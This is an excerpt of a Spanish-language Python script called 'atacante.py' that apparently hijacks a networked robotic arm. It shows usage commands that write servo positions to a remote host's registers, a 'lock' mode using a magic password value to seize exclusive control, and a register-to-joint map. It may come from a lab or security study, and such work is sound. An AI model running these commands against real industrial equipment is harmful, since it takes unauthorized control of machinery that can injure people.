...
Uso basico:
  ...
  python3 atacante.py --rhost 10.197.4.77 --data_address 100,101,102,103,104,105 --sequence -s1 138,144,112,75,153,97 -s2 10,118,90,75,105,121 --delay 2 --loop
...
Control exclusivo (lock):
  ...
  python3 atacante.py --rhost 10.197.4.77 --lock --sequence -s1 90,90,90,90,90,90 --data_address 100,101,102,103,104,105 --delay 2 --loop
...
LOCK_MAGIC      = 0xA5A5 # "contraseña" para el lock
LOCK_TTL_SEG    = 15     # debe coincidir con LOCK_TTL_SECONDS del firmware

# ─── N° de registros por servo ─────────────────────────────────────────────────────────────────
JOINTS = {
    100: "Pinza",
    101: "Rot.Pinza",
    102: "Muneca",
